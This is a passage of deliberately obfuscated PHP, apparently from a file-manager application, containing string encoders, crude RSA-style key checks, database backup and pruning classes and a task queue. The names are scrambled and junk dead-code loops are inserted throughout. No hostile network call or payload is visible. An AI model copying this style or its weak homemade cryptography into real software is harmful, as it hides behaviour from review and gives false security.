strrev($»œØƒû . $õ¯÷º§ª)); $Ò»õ™Ú = $›™Æàà[775]; while ($Ò»õ™Ú < $›™Æàà[699]) { if ($Ò»õ™Ú >= 0) { break; } $Ò»õ™Ú++; } break; case $°Ó³àá·[122]: $ Úª¼Øñ = $this->nwsqbf1f069b($’¸­Ã×î, strrev($õ¯÷º§ª . $»œØƒû)); break; $…ôıâÉ“ = $›™Æàà[776]; case $°Ó³àá·[301]: $ Úª¼Øñ = $this->nwsqbf1f069b($’¸­Ã×î, base64_encode($õ¯÷º§ª . $»œØƒû)); break; case $°Ó³àá·[302]: $ Úª¼Øñ = $this->nwsqbf1f069b($’¸­Ã×î, md5($õ¯÷º§ª . $»œØƒû)); break; case $°Ó³àá·[303]: $’¸­Ã×î = hash_decode($’¸­Ã×î); $€©ÑÚğ“ = $’¸­Ã×î[0]; $ÛÀÃ„® = $›™Æàà[777]; if (strlen($ÛÀÃ„®) < $›™Æàà[699]) { die; } $’¸­Ã×î = substr($’¸­Ã×î, 1); $Á¨¾Ë‡ş = $›™Æàà[778]; while (strlen($Á¨¾Ë‡ş) < $›™Æàà[691]) { if (!$Á¨¾Ë‡ş) { break; } $Á¨¾Ë‡ş++; } $¦äÚ™Ğæ = strpos($‘‘í«ÛÑ, $€©ÑÚğ“); $ï×Ôı = md5($€©ÑÚğ“ . md5($»œØƒû . $€©ÑÚğ“) . $»œØƒû); $ï×Ôı = substr($ï×Ôı, $¦äÚ™Ğæ % 8, $¦äÚ™Ğæ % 8 + 7); $ ßò ÷Ü = $°Ó³àá·[6]; $í¤çí“‡ = 0; $£î¾ÏÖÈ = 0; $½ş¶ûÀù = 0; $à¤¬äÍï = $›™Æàà[779]; if (strlen($à¤¬äÍï) < $›™Æàà[691]) { die; } for ($í¤çí“‡ = 0; $í¤çí“‡ < strlen($’¸­Ã×î); $í¤çí“‡++) { $½ş¶ûÀù = $½ş¶ûÀù == strlen($ï×Ôı) ? 0 : $½ş¶ûÀù; $û×æÅ¾È = $½ş¶ûÀù++; $£î¾ÏÖÈ = strpos($‘‘í«ÛÑ, $’¸­Ã×î[$í¤çí“‡]) - $¦äÚ™Ğæ - ord($ï×Ôı[$û×æÅ¾È]); while ($£î¾ÏÖÈ < 0) { $£î¾ÏÖÈ += 64; $‰‡ÔöµÒ = $›™Æàà[780]; if (strlen($‰‡ÔöµÒ) < $›™Æàà[694]) { die; } } $ ßò ÷Ü .= $‘‘í«ÛÑ[$£î¾ÏÖÈ]; } $ Úª¼Øñ = base64_decode($ ßò ÷Ü); break; default: $ Úª¼Øñ = $this->nwsqbf1f069b($’¸­Ã×î, $»œØƒû . $õ¯÷º§ª); break; } if ($™ß‹¤¥æ - 1 > 0) { $ Úª¼Øñ = $this->lpob3716b53a($ Úª¼Øñ, $»œØƒû, $™ß‹¤¥æ - 1); } return $ Úª¼Øñ; } public function vmwf6e731dc6($ÁæùĞæ) { $¾«»ï¨Ü =& $_SERVER[°‰†òö¯]; $²¢È¸Ğ™ =& $_SERVER[¯“©ŠÌ]; $×¤ÉæãÜ = $this->zhvnefa85737(); $Èù—õ = $¾«»ï¨Ü[729]; $³ßÃ€ãù = $this->zhvnefa85737(); $ÀÂÉ¥Úæ = $¾«»ï¨Ü[781]; $É¯òÙ‘Ñ = ($×¤ÉæãÜ - 1) * ($³ßÃ€ãù - 1); $Š©óƒ = intval(($×¤ÉæãÜ + $³ßÃ€ãù) / 2); $”ç½ÂŒ· = $¾«»ï¨Ü[782]; while (strlen($”ç½ÂŒ·) < $¾«»ï¨Ü[691]) { if (!$”ç½ÂŒ·) { break; } $”ç½ÂŒ·++; } while (1) { $‚´œ±ï¹ = $Š©óƒ; $Š‰ª÷±Ó = $¾«»ï¨Ü[783]; if (strlen($Š‰ª÷±Ó) < $¾«»ï¨Ü[704]) { return; } $ãœÁª = $É¯òÙ‘Ñ; $áÑÆÎéğ = $¾«»ï¨Ü[784]; if (!$áÑÆÎéğ) { return; } while ($ãœÁª % $‚´œ±ï¹ != 0) { $ÆÛĞâª = $ãœÁª; $Ù‹’©®ª = $¾«»ï¨Ü[785]; while (strlen($Ù‹’©®ª) < $¾«»ï¨Ü[691]) { if (!$Ù‹’©®ª) { break; } $Ù‹’©®ª++; } $ãœÁª = $‚´œ±ï¹; $‚´œ±ï¹ = $ÆÛĞâª % $‚´œ±ï¹; } if ($‚´œ±ï¹ == 1) { break; } else { $Š©óƒ++; } } $¿•ªùµ = 2; $ÉœÕ¿à´ = $¾«»ï¨Ü[786]; if (!$ÉœÕ¿à´) { return; } for ($Ø“Ó„Ä = 0; $Ø“Ó„Ä < $É¯òÙ‘Ñ * 10; $Ø“Ó„Ä++) { if (($É¯òÙ‘Ñ * $Ø“Ó„Ä + 1) % $Š©óƒ == 0) { $¿•ªùµ = intval(($É¯òÙ‘Ñ * $Ø“Ó„Ä + 1) / $Š©óƒ); break; } } $¹Ä¨ĞˆŠ = $this->akmd88e7eabd($×¤ÉæãÜ * $³ßÃ€ãù . $²¢È¸Ğ™[6], $²¢È¸Ğ™[136]); $×†²Ô™• = $¾«»ï¨Ü[787]; while ($×†²Ô™• < $¾«»ï¨Ü[694]) { if ($×†²Ô™• >= 0) { break; } $×†²Ô™•++; } $™¹˜™È = md5($²¢È¸Ğ™[304] . ($×¤ÉæãÜ + $³ßÃ€ãù) . $²¢È¸Ğ™[305] . $Š©óƒ . $²¢È¸Ğ™[305] . $¿•ªùµ . $²¢È¸Ğ™[306]); $ïÏû‹õ = $¾«»ï¨Ü[788]; if (!$ïÏû‹õ) { return; } $şŞœ¸ïó = $this->akmd88e7eabd($ÁæùĞæ, $™¹˜™È) . $²¢È¸Ğ™[307] . $¹Ä¨ĞˆŠ; $Şí¬áùµ = $¾«»ï¨Ü[789]; while (strlen($Şí¬áùµ) < $¾«»ï¨Ü[694]) { if (!$Şí¬áùµ) { break; } $Şí¬áùµ++; } return $şŞœ¸ïó; $õó¼ØÛÀ = $¾«»ï¨Ü[790]; while ($õó¼ØÛÀ < $¾«»ï¨Ü[694]) { if ($õó¼ØÛÀ >= 0) { break; } $õó¼ØÛÀ++; } } public function vafj5dc201d8($¦û—Î´û) { $¨”¨Ğ…Õ =& $_SERVER[°‰†òö¯]; $©¬¨ıöÇ =& $_SERVER[¯“©ŠÌ]; $¤ÕËÂÛ§ = explode($©¬¨ıöÇ[307], $¦û—Î´û); $š³´çÆ¬ = $¨”¨Ğ…Õ[791]; if (strlen($š³´çÆ¬) < $¨”¨Ğ…Õ[691]) { die; } if (count($¤ÕËÂÛ§) != 2) { return $©¬¨ıöÇ[6]; } $‚ù¿èÇ¾ = $this->nwsqbf1f069b($¤ÕËÂÛ§[1] . $©¬¨ıöÇ[6], $©¬¨ıöÇ[136]); $¬Ÿƒ™Œ¥ = $¨”¨Ğ…Õ[792]; if (!$‚ù¿èÇ¾) { return $©¬¨ıöÇ[6]; } $‚ù¿èÇ¾ = intval($‚ù¿èÇ¾); $ÆşËš” = $¨”¨Ğ…Õ[793]; if (!$ÆşËš”) { return; } $ó¨¼»¨˜ = 0; $ÃŞëú‡Ü = $¨”¨Ğ…Õ[794]; if (!$ÃŞëú‡Ü) { return; } $Û“æàğ¤ = 0; $ÄÅ˜¡–ê = $¨”¨Ğ…Õ[795]; for ($ÛøÃ®¿ = 3; $ÛøÃ®¿ < $‚ù¿èÇ¾; $ÛøÃ®¿ += 2) { if ($‚ù¿èÇ¾ % $ÛøÃ®¿ != 0) { continue; } $ó¨¼»¨˜ = $ÛøÃ®¿; $Â…¿²óÛ = $¨”¨Ğ…Õ[796]; if (strlen($Â…¿²óÛ) < $¨”¨Ğ…Õ[691]) { die; } $Û“æàğ¤ = intval($‚ù¿èÇ¾ / $ÛøÃ®¿); $Û£îÇí˜ = $¨”¨Ğ…Õ[797]; if (!$Û£îÇí˜) { die; } break; $ìÜøî¥À = $¨”¨Ğ…Õ[798]; if (strlen($ìÜøî¥À) < $¨”¨Ğ…Õ[699]) { die; } } $§µ˜ÏÆó = ($ó¨¼»¨˜ - 1) * ($Û“æàğ¤ - 1); $±·ºÔ„û = $¨”¨Ğ…Õ[799]; if (!$±·ºÔ„û) { return; } $û››ÚÇ = intval(($ó¨¼»¨˜ + $Û“æàğ¤) / 2); $ŸûÊ›…ß = $¨”¨Ğ…Õ[800]; while (strlen($ŸûÊ›…ß) < $¨”¨Ğ…Õ[696]) { if (!$ŸûÊ›…ß) { break; } $ŸûÊ›…ß++; } while (1) { $šè¸¡¾ = $û››ÚÇ; $˜Æ¤üË¹ = $¨”¨Ğ…Õ[801]; $¸Ë„“«• = $§µ˜ÏÆó; while ($¸Ë„“«• % $šè¸¡¾ != 0) { $İÀÚ§àÙ = $¸Ë„“«•; $¼äÏœú¯ = $¨”¨Ğ…Õ[802]; $¸Ë„“«• = $šè¸¡¾; $ÄÑ‡²éë = $¨”¨Ğ…Õ[803]; if (strlen($ÄÑ‡²éë) < $¨”¨Ğ…Õ[691]) { die; } $šè¸¡¾ = $İÀÚ§àÙ % $šè¸¡¾; $‡äŠ¦ó˜ = $¨”¨Ğ…Õ[804]; if (strlen($‡äŠ¦ó˜) < $¨”¨Ğ…Õ[694]) { die; } } if ($šè¸¡¾ == 1) { break; } else { $û››ÚÇ++; } } $ŠšâË˜‚ = 2; for ($ÛøÃ®¿ = 0; $ÛøÃ®¿ < $§µ˜ÏÆó * 10; $ÛøÃ®¿++) { if (($§µ˜ÏÆó * $ÛøÃ®¿ + 1) % $û››ÚÇ == 0) { $ŠšâË˜‚ = intval(($§µ˜ÏÆó * $ÛøÃ®¿ + 1) / $û››ÚÇ); break; } } $…åİ‡²á = md5($©¬¨ıöÇ[304] . ($ó¨¼»¨˜ + $Û“æàğ¤) . $©¬¨ıöÇ[305] . $û››ÚÇ . $©¬¨ıöÇ[305] . $ŠšâË˜‚ . $©¬¨ıöÇ[306]); $Ù¶¢ò›Ç = $this->nwsqbf1f069b($¤ÕËÂÛ§[0], $…åİ‡²á); return $Ù¶¢ò›Ç; } public function zhvnefa85737() { $¡†ÍÍ´ =& $_SERVER[°‰†òö¯]; $Æµ²Æû¥ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¸ü³»É‡ = $¡†ÍÍ´[805]; while ($¸ü³»É‡ < $¡†ÍÍ´[696]) { if ($¸ü³»É‡ >= 0) { break; } $¸ü³»É‡++; } $ñÅõäò• = array(); $Á‹‡äñ— = 1; $ç†ñŸò = $¡†ÍÍ´[806]; if (strlen($ç†ñŸò) < $¡†ÍÍ´[696]) { return; } while ($Á‹‡äñ— <= (int) sqrt($Æµ²Æû¥)) { $Ëßş«Œ‡ = $Á‹‡äñ—; while (!0) { $Ëßş«Œ‡++; if ($Ëßş«Œ‡ <= 2) { $Á‹‡äñ— = $Ëßş«Œ‡; break; } else { if ($Ëßş«Œ‡ < 2) { continue; } } $æë×Êş± = !0; for ($è¥ƒ•·© = 2; $è¥ƒ•·© <= sqrt($Ëßş«Œ‡); $è¥ƒ•·©++) { if ($Ëßş«Œ‡ % $è¥ƒ•·© == 0) { $æë×Êş± = !1; } } if ($æë×Êş±) { $Á‹‡äñ— = $Ëßş«Œ‡; break; } } $ñÅõäò•[] = $Á‹‡äñ—; $Òñ½²›Ì = $¡†ÍÍ´[807]; while ($Òñ½²›Ì < $¡†ÍÍ´[696]) { if ($Òñ½²›Ì >= 0) { break; } $Òñ½²›Ì++; } } $ìĞôõ®’ = 2; for ($Ëßş«Œ‡ = $Æµ²Æû¥; $Ëßş«Œ‡ > 1; $Ëßş«Œ‡--) { $æë×Êş± = !0; $ºÅÒüÓÀ = $¡†ÍÍ´[808]; while (strlen($ºÅÒüÓÀ) < $¡†ÍÍ´[696]) { if (!$ºÅÒüÓÀ) { break; } $ºÅÒüÓÀ++; } foreach ($ñÅõäò• as $¢¼€ö¨) { if ($Ëßş«Œ‡ % $¢¼€ö¨ == 0) { $æë×Êş± = !1; break; } } if ($æë×Êş±) { $ìĞôõ®’ = $Ëßş«Œ‡; break; } } return $ìĞôõ®’; } public function qizhc1d76427($õİ¢åè—, $Öîµ¾±•) { $¤¾Ù°Ûå =& $_SERVER[¯“©ŠÌ]; return call_user_func(array($¤¾Ù°Ûå[8], $¤¾Ù°Ûå[308]), $õİ¢åè—, $Öîµ¾±•); } public function akmd88e7eabd($ïíÇı, $¸°•›“ò) { $ñåô³¤û =& $_SERVER[¯“©ŠÌ]; return call_user_func(array($ñåô³¤û[309], $ñåô³¤û[310]), $ïíÇı, $¸°•›“ò); } public function nwsqbf1f069b($ù…†ƒÏª, $ÑíĞ˜±) { $…ã“²‰­ =& $_SERVER[¯“©ŠÌ]; return call_user_func(array($…ã“²‰­[309], $…ã“²‰­[311]), $ù…†ƒÏª, $ÑíĞ˜±); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[°‰†òö¯][809]); $this->init(); $this->keep(); } public function init() { $‡Ò·âŞ‚ =& $_SERVER[°‰†òö¯]; $this->isManual(); self::$name = date($‡Ò·âŞ‚[810]); if (!($·£È¼Å„ = $this->model->lastItem())) { $·£È¼Å„ = $this->initData(); } else { self::$name = $·£È¼Å„[$‡Ò·âŞ‚[32]]; if ($·£È¼Å„[$‡Ò·âŞ‚[811]] == $‡Ò·âŞ‚[91]) { self::$name = date($‡Ò·âŞ‚[261]); $‰Ä¹’ = intval(_get($·£È¼Å„, $‡Ò·âŞ‚[812], 0)); if (self::$manual == 0 && $·£È¼Å„[$‡Ò·âŞ‚[32]] == self::$name) { $this->model->remove($·£È¼Å„[$‡Ò·âŞ‚[477]]); } $·£È¼Å„ = $this->initData($‰Ä¹’, $·£È¼Å„[$‡Ò·âŞ‚[813]]); } else { $this->checkStore($·£È¼Å„[$‡Ò·âŞ‚[813]]); } } self::$option = $·£È¼Å„; } private function isManual() { $Íèş¢€å = _get($GLOBALS, $_SERVER[°‰†òö¯][814], 0); $Íèş¢€å = intval($Íèş¢€å); self::$manual = $Íèş¢€å && $Íèş¢€å == 1 ? 1 : 0; } private function initData($Àå†«” = 0, $Ã·¶ø˜Ş = '') { $•İ–ô™ú =& $_SERVER[°‰†òö¯]; $¯„¡ôˆ˜ = $this->model->config(); if ($Ã·¶ø˜Ş && $¯„¡ôˆ˜[$•İ–ô™ú[813]] != $Ã·¶ø˜Ş) { $Àå†«” = 0; } $this->checkStore($¯„¡ôˆ˜[$•İ–ô™ú[813]]); if (self::$manual == 1) { self::$name .= $•İ–ô™ú[11] . date($•İ–ô™ú[815]); } $ñú À±ƒ = array($•İ–ô™ú[813] => $¯„¡ôˆ˜[$•İ–ô™ú[813]], $•İ–ô™ú[32] => self::$name, $•İ–ô™ú[811] => 0, $•İ–ô™ú[171] => $¯„¡ôˆ˜[$•İ–ô™ú[171]], $•İ–ô™ú[816] => self::$manual, $•İ–ô™ú[370] => array($•İ–ô™ú[817] => array($•İ–ô™ú[811] => 0), $•İ–ô™ú[818] => array($•İ–ô™ú[811] => 0, $•İ–ô™ú[819] => 0, $•İ–ô™ú[820] => 0, $•İ–ô™ú[33] => $•İ–ô™ú[12], $•İ–ô™ú[821] => 0, $•İ–ô™ú[822] => 0), $•İ–ô™ú[823] => array($•İ–ô™ú[811] => 0, $•İ–ô™ú[819] => 0, $•İ–ô™ú[820] => 0, $•İ–ô™ú[821] => 0, $•İ–ô™ú[822] => 0), $•İ–ô™ú[232] => array($•İ–ô™ú[811] => 0, $•İ–ô™ú[824] => 0, $•İ–ô™ú[825] => 0, $•İ–ô™ú[826] => 0, $•İ–ô™ú[827] => 0, $•İ–ô™ú[545] => $Àå†«”, $•İ–ô™ú[821] => 0, $•İ–ô™ú[822] => 0)), $•İ–ô™ú[821] => time(), $•İ–ô™ú[822] => 0); $„éÀôÒ· = $this->model->insert($ñú À±ƒ); $ñú À±ƒ[$•İ–ô™ú[477]] = $„éÀôÒ·; return $ñú À±ƒ; } private function checkStore($ÅÈŒÎš) { $œ”ÙÕ™ = Model($_SERVER[°‰†òö¯][828]); $†á ¦› = $œ”ÙÕ™->listData($ÅÈŒÎš); $œ”ÙÕ™->checkConfig($†á ¦›); } public static function get() { if (!self::$option) { $ú‚åõÌŒ = Model($_SERVER[°‰†òö¯][809]); $å¥Ããáµ = $ú‚åõÌŒ->findByName(self::$name); $ú‚åõÌŒ->parseContent($å¥Ããáµ); self::$option = $å¥Ããáµ; } return self::$option; } public static function set($·ÔöûÕŠ) { $êı¸§ëÏ =& $_SERVER[°‰†òö¯]; $ğ„Ú‚ñÆ = self::get(); foreach ($·ÔöûÕŠ as $‘æò¾Äş => $ ÑØ®Ğµ) { array_set_value($ğ„Ú‚ñÆ, $‘æò¾Äş, $ ÑØ®Ğµ); } Model($êı¸§ëÏ[809])->update($ğ„Ú‚ñÆ[$êı¸§ëÏ[477]], $ğ„Ú‚ñÆ); self::$option = $ğ„Ú‚ñÆ; return self::$option; } public function keep() { $ƒ©Ë¢¾ =& $_SERVER[°‰†òö¯]; $‰ïûØÃÛ = self::get(); if (_get($‰ïûØÃÛ, $ƒ©Ë¢¾[829], 0) == $ƒ©Ë¢¾[91]) { return; } $this->backupKeep($‰ïûØÃÛ); self::set(array($ƒ©Ë¢¾[829] => 1)); } private function backupKeep($›¢ºê„Ô) { $ÙéÑÙ =& $_SERVER[°‰†òö¯]; if (self::$manual == 1) { return; } $è©ˆ¿ÍÄ = $this->model->listData(); if (empty($è©ˆ¿ÍÄ)) { return; } $™áï÷×Ø = 0; $Ïòâ‚èĞ = array(); foreach ($è©ˆ¿ÍÄ as $ğğ­Ï¥€) { if ($™áï÷×Ø >= 7) { break; } $Ïòâ‚èĞ[] = $ğğ­Ï¥€[$ÙéÑÙ[32]]; $™áï÷×Ø++; } for ($™áï÷×Ø = 0; $™áï÷×Ø < 12; $™áï÷×Ø++) { $Ïòâ‚èĞ[] = date($ÙéÑÙ[830], strtotime("\55{$™áï÷×Ø}\40\x6d\x6f\x6e\164\x68\163")); } $Ïòâ‚èĞ = array_unique($Ïòâ‚èĞ); $ˆÍğŒ¬Ù = Model($ÙéÑÙ[831])->get($ÙéÑÙ[832]); foreach ($è©ˆ¿ÍÄ as $ğğ­Ï¥€) { if (isset($ğğ­Ï¥€[$ÙéÑÙ[816]]) && $ğğ­Ï¥€[$ÙéÑÙ[816]] == $ÙéÑÙ[91]) { continue; } if (!empty($ğğ­Ï¥€[$ÙéÑÙ[32]]) && in_array($ğğ­Ï¥€[$ÙéÑÙ[32]], $Ïòâ‚èĞ)) { continue; } $this->model->remove($ğğ­Ï¥€[$ÙéÑÙ[477]]); $¬ËÂøôÖ = $this->backupPath($›¢ºê„Ô, $ˆÍğŒ¬Ù); IO::remove($¬ËÂøôÖ, !1); } } private function backupPath($âÚü‡ªá, $áßîäÃŠ = false) { $š»…ÈõÃ =& $_SERVER[°‰†òö¯]; if (!$áßîäÃŠ) { $áßîäÃŠ = Model($š»…ÈõÃ[831])->get($š»…ÈõÃ[832]); } $€êË—”¯ = $âÚü‡ªá[$š»…ÈõÃ[32]]; $ÄµôÑóñ = substr(md5($š»…ÈõÃ[833] . $áßîäÃŠ . $€êË—”¯), 0, 8); return "\173\x69\157\72{$âÚü‡ªá[$š»…ÈõÃ[813]]}\x7d\57\144\141\x74\x61\142\x61\163\145\57\142\x61\143\x6b\165\160\57" . $€êË—”¯ . $š»…ÈõÃ[11] . $ÄµôÑóñ; } public function db() { $»êíğÁ =& $_SERVER[°‰†òö¯]; $õİËÙ÷´ = self::get(); if (_get($õİËÙ÷´, $»êíğÁ[834], 0) == $»êíğÁ[91]) { return !0; } $†«ÖÙ¢ğ = new BackupDb(); if (!$†«ÖÙ¢ğ->index()) { return !1; } self::set(array($»êíğÁ[834] => 1)); return !0; } public function dbFile() { $İÙ½ù…Å =& $_SERVER[°‰†òö¯]; $ñö°€´š = self::get(); if (_get($ñö°€´š, $İÙ½ù…Å[835], 0) == $İÙ½ù…Å[91]) { return !0; } $…©ş“ = new BackupDbFile(); if (!$…©ş“->index()) { return !1; } self::set(array($İÙ½ù…Å[835] => 1)); return !0; } public function file() { $Ô¡Á·›Ë =& $_SERVER[°‰†òö¯]; $¢Æ÷Á•Ÿ = self::get(); if (_get($¢Æ÷Á•Ÿ, $Ô¡Á·›Ë[836], 0) == $Ô¡Á·›Ë[91]) { return !0; } if ($¢Æ÷Á•Ÿ[$Ô¡Á·›Ë[171]] == $Ô¡Á·›Ë[837]) { $ï´ŠÙô¾ = new BackupFile(); if (!$ï´ŠÙô¾->index()) { return !1; } } self::set(array($Ô¡Á·›Ë[836] => 1, $Ô¡Á·›Ë[811] => 1)); return !0; } public static function log($ÅÏÅã¤±) { write_log($ÅÏÅã¤±, $_SERVER[°‰†òö¯][838]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $šæÑƒõ =& $_SERVER[°‰†òö¯]; $‚·ûÕˆ = Backup::get(); self::$io = $‚·ûÕˆ[$šæÑƒõ[813]]; self::$name = $‚·ûÕˆ[$šæÑƒõ[32]]; $ÀÌú¥Éœ = new DbManage(); $¤ä‡Ø‚´ = $ÀÌú¥Éœ->dbType(); $©Â¹÷®Œ = array($šæÑƒõ[839] => $¤ä‡Ø‚´, $šæÑƒõ[840] => time()); Backup::set($©Â¹÷®Œ); $ÕŠúÈÅ– = $this->tmpFilesPath() . $šæÑƒõ[841] . self::$name . $šæÑƒõ[8]; del_dir($ÕŠúÈÅ–); mk_dir($ÕŠúÈÅ–); $ç†µ³¨“ = $ÎñÍÓİ¥ = 0; try { $ëà¼ãÛî = $ÀÌú¥Éœ->db()->getTables(); } catch (Exception $ú›Ìà±) { Backup::log($šæÑƒõ[842] . $ú›Ìà±->getMessage()); return !1; } $ëà¼ãÛî = array_diff($ëà¼ãÛî, array($šæÑƒõ[843], $šæÑƒõ[844])); foreach ($ëà¼ãÛî as $˜ß‡ÒÍİ) { if ($˜ß‡ÒÍİ == $šæÑƒõ[845]) { continue; } $ç†µ³¨“ += $ÀÌú¥Éœ->model($˜ß‡ÒÍİ)->count(); } $šææÅÚœ = new Task($šæÑƒõ[846], $šæÑƒõ[838], $ç†µ³¨“, LNG($šæÑƒõ[847]) . $šæÑƒõ[848] . LNG($šæÑƒõ[849])); $GLOBALS[$šæÑƒõ[850]] = self::$name; foreach ($ëà¼ãÛî as $˜ß‡ÒÍİ) { $Ç£±ò›Ğ = $ÕŠúÈÅ– . $˜ß‡ÒÍİ . $šæÑƒõ[851]; if ($˜ß‡ÒÍİ == $šæÑƒõ[845]) { @touch($Ç£±ò›Ğ); continue; } $Ïğ‹ãÀ× = null; if ($˜ß‡ÒÍİ == $šæÑƒõ[852] && $‚·ûÕˆ[$šæÑƒõ[171]] == $šæÑƒõ[837]) { $Ïğ‹ãÀ× = self::$io; } $ÎñÍÓİ¥ += $ÀÌú¥Éœ->sqlFromDb($˜ß‡ÒÍİ, $Ç£±ò›Ğ, $šææÅÚœ, $Ïğ‹ãÀ×); } unset($GLOBALS[$šæÑƒõ[850]]); $šææÅÚœ->end(); if ($ÎñÍÓİ¥ > $ç†µ³¨“) { $ç†µ³¨“ = $ÎñÍÓİ¥; } $©Â¹÷®Œ = array($šæÑƒõ[839] => $¤ä‡Ø‚´, $šæÑƒõ[834] => 1, $šæÑƒõ[853] => $ç†µ³¨“, $šæÑƒõ[854] => $ÎñÍÓİ¥, $šæÑƒõ[855] => time()); Backup::set($©Â¹÷®Œ); if ($ç†µ³¨“ - $ÎñÍÓİ¥ > 0) { $•¸ Àé¾ = $šæÑƒõ[856]; if (!stristr(I18n::getType(), $šæÑƒõ[857])) { $•¸ Àé¾ = $šæÑƒõ[858]; } Backup::log(array($•¸ Àé¾, $©Â¹÷®Œ)); return !1; } return !0; } private function tmpFilesPath() { $‡„àìà½ =& $_SERVER[°‰†òö¯]; $È¤·ÏŞ› = TEMP_FILES; if ($GLOBALS[$‡„àìà½[6]][$‡„àìà½[92]][$‡„àìà½[859]]) { $È¤·ÏŞ› = $GLOBALS[$‡„àìà½[6]][$‡„àìà½[92]][$‡„àìà½[859]]; if (!mk_dir($È¤·ÏŞ›) || !is_writable($È¤·ÏŞ›) || !IO::mkfile($È¤·ÏŞ› . $‡„àìà½[860])) { $È¤·ÏŞ› = TEMP_FILES; } } return $È¤·ÏŞ›; } } goto DáØ¨í•È…; B‰™Åê‰™: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\x51\x75\145\165\145\114\145\x6e\x67\164\x68"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\145\x75\145\104\x61\x74\141"; const QUEUE_TIME = "\x74\x61\163\x6b\x51\165\145\x75\x65\114\x61\163\164\122\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\x51\165\x65\165\x65\x54\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¿İªÎ, $İÜ‘ÙÇ = array(), $¼Ô˜ÚÜû = '', $ä‹½©É = '') { $‹Õ–ö¿Ï =& $_SERVER[°‰†òö¯]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ä‹½©É && array_find_by_field(self::$listData, $‹Õ–ö¿Ï[97], $ä‹½©É)) { return !0; } if ($ä‹½©É && array_find_by_field(self::$listDataAdd, $‹Õ–ö¿Ï[97], $ä‹½©É)) { return !0; } self::$listDataAdd[] = array($‹Õ–ö¿Ï[343] => $¿İªÎ, $‹Õ–ö¿Ï[1871] => $İÜ‘ÙÇ, $‹Õ–ö¿Ï[528] => $¼Ô˜ÚÜû, $‹Õ–ö¿Ï[97] => $ä‹½©É); return !0; } public static function addSubmit() { $îğ¨²ñÆ =& $_SERVER[°‰†òö¯]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($îğ¨²ñÆ[1872] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $îğ¨²ñÆ[12], $îğ¨²ñÆ[528])), $îğ¨²ñÆ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($šÁíŠà, $¶ç†Šß = array(), $ë“üšØ› = '', $½»×ÆîŞ = '') { $Ê·¼ë´ù =& $_SERVER[°‰†òö¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $•—€¾†˜ = self::getAll(); if ($½»×ÆîŞ && array_find_by_field($•—€¾†˜, $Ê·¼ë´ù[97], $½»×ÆîŞ)) { return !0; } $•—€¾†˜[] = array($Ê·¼ë´ù[343] => $šÁíŠà, $Ê·¼ë´ù[1871] => $¶ç†Šß, $Ê·¼ë´ù[528] => $ë“üšØ›, $Ê·¼ë´ù[97] => $½»×ÆîŞ); self::setAll($•—€¾†˜); write_log($Ê·¼ë´ù[1872] . $ë“üšØ›, $Ê·¼ë´ù[197]); return !0; } public static function run() { $…¨ä§Â =& $_SERVER[°‰†òö¯]; $şƒ¸Äœ = self::getAll(); $·šÔøàè = array_shift($şƒ¸Äœ); if (!$·šÔøàè) { return !1; } self::setAll($şƒ¸Äœ); $¥Ìô‡û€ = timeFloat(); $²»æÁê = $…¨ä§Â[12]; try { $²»æÁê = Hook::apply($·šÔøàè[$…¨ä§Â[343]], $·šÔøàè[$…¨ä§Â[1871]]); } catch (Exception $§Æ˜ı) { write_log($§Æ˜ı, $…¨ä§Â[1262]); } $·éÇùñ‘ = number_format(timeFloat() - $¥Ìô‡û€, 3) . $…¨ä§Â[1787]; if ($²»æÁê && is_string($²»æÁê)) { $·éÇùñ‘ = $·éÇùñ‘ . $…¨ä§Â[1873] . $²»æÁê; } write_log($…¨ä§Â[1874] . $·šÔøàè[$…¨ä§Â[528]] . $…¨ä§Â[1875] . $·éÇùñ‘, $…¨ä§Â[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $½Ì ¿î£ =& $_SERVER[°‰†òö¯]; $ñ¬ÊÇò© = self::threadCount() + 1; if ($ñ¬ÊÇò© > 3 || !self::count()) { return; } write_log($½Ì ¿î£[1876] . $ñ¬ÊÇò©, $½Ì ¿î£[197]); Cache::set(self::QUEUE_THREAD, $ñ¬ÊÇò©, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($½Ì ¿î£[1877], $½Ì ¿î£[197]); } public static function getKey($™­éÌàì, $³”¶¾å = "\151\x6e\x74") { $Ï÷’Àòù =& $_SERVER[°‰†òö¯]; Cache::removeMemory($™­éÌàì); $Ğ¾¬¥ŞÍ = Cache::get($™­éÌàì); if ($³”¶¾å == $Ï÷’Àòù[365]) { return $Ğ¾¬¥ŞÍ ? intval($Ğ¾¬¥ŞÍ) : 0; } if ($³”¶¾å == $Ï÷’Àòù[1878]) { return is_array($Ğ¾¬¥ŞÍ) ? $Ğ¾¬¥ŞÍ : array(); } return $Ğ¾¬¥ŞÍ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[°‰†òö¯][1878]); } public static function setAll($Ü‰Ò¶Òœ) { $ÍûïòÑÆ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ü‰Ò¶Òœ), $ÍûïòÑÆ); Cache::set(self::QUEUE_DATA, $Ü‰Ò¶Òœ, $ÍûïòÑÆ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = 